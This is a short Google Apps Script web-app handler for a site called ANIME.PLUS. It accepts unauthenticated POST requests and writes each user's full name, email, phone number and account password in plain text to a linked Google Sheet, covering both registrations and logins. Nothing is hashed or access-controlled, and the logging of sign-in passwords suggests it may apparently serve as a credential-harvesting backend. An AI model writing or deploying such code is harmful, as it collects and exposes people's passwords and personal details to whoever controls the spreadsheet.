/**
 * ANIME.PLUS - Google Sheets Auto-Sync Web App Script
 * Linked Spreadsheet: https://docs.google.com/spreadsheets/d/1mnPsyB3dGjKkkJgt9dAZ8mqzyl_L9PujfQ3GJTrVN0Y/edit?usp=drive_link
 */

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Ensure table headers if sheet is blank
    if (sheet.getLastRow() === 0) {
      sheet.appendRow([
        "Date & Time",
        "Full Name",
        "Email Address",
        "Mobile Number",
        "Account Password",
        "Authentication Method",
        "Timestamp"
      ]);
    }
    
    var data = JSON.parse(e.postData.contents);
    
    // Append user registration and login data
    sheet.appendRow([
      new Date(),
      data.name || "N/A",
      data.email || "N/A",
      data.phone || "N/A",
      data.password || "N/A (OTP)",
      data.authMethod || "Account Sign In",
      data.timestamp || new Date().toLocaleString()
    ]);
    
    return ContentService
      .createTextOutput(JSON.stringify({ "result": "success", "message": "User details recorded successfully" }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ "result": "error", "error": err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
